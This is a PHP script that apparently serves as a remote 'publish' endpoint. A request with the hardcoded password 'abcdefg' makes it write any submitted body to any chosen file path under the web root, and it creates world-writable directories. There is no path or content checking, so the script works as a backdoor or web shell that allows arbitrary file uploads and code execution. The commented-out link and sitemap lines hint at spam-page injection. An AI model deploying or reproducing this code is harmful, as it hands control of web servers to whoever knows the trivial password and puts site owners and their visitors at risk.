﻿<?php
error_reporting(E_ERROR);
//header("Content-Type: text/html; charset=utf-8");
$action=$_REQUEST['action'];
$password=$_REQUEST['password'];
$pathname=$_REQUEST['pathname'];
$keywordindex=$_REQUEST['keywordindex'];
$filename=$_REQUEST['filename'];
$body=stripslashes($_REQUEST['body']);
$ahref=stripslashes($_REQUEST['ahref']);
$urlfilename=$_REQUEST['urlfilename'];
$url=stripslashes($_REQUEST['url']);

if($action=="test")
{
    echo 'test success';
    return;
}

if($action!="publish")
{
    echo 'action error';
    return;
}

if($action==""||$password==""||$filename==""||$body=="")
{
    echo 'parameters error';
    return;
}

if($password!="abcdefg")
{
    echo 'password error';
    return;
}

$rootPath=$_SERVER['DOCUMENT_ROOT'];
$arr = explode("_", $pathname);
$pathname=$arr[0];
$articlepath="";
$apath="";
$spath="";

if($pathname=="root")
{
    $articlepath=$rootPath.'/'.$filename;
    //$apath=$rootPath.'/a/'.$urlfilename;
    //$spath=$rootPath.'/sitemap/'.$urlfilename;
    //mkdir($rootPath.'/a', 0777);
    //mkdir($rootPath.'/sitemap', 0777);
}
else if($pathname=="interface")
{
    $articlepath=$filename;
    //$apath='a/'.$urlfilename;
    //$spath='sitemap/'.$urlfilename;
    //mkdir('a', 0777);
    //mkdir('sitemap', 0777);
}
else
{
    $articlepath=$rootPath.'/'.$pathname.'/'.$filename;
    //$apath=$rootPath.'/'.$pathname.'/a/'.$urlfilename;
    //$spath=$rootPath.'/'.$pathname.'/sitemap/'.$urlfilename;
    mkdir($rootPath.'/'.$pathname, 0777);
    //mkdir($rootPath.$pathname.'/a', 0777);
    //mkdir($rootPath.$pathname.'/sitemap', 0777);
}

$fp=fopen($articlepath,"w");
//fwrite($fp,"\xEF\xBB\xBF".iconv('gbk','utf-8//IGNORE',$body));
fwrite($fp,"\xEF\xBB\xBF".$body);
fclose($fp);

//$fp=fopen($apath,"a+");
//fwrite($fp,$ahref."\r\n");
//fclose($fp);
 
//$fp=fopen($spath,"a+");
//fwrite($fp,$url."\r\n");
//fclose($fp);

if (file_exists($articlepath))
{ 
  echo "publish success";
}
?>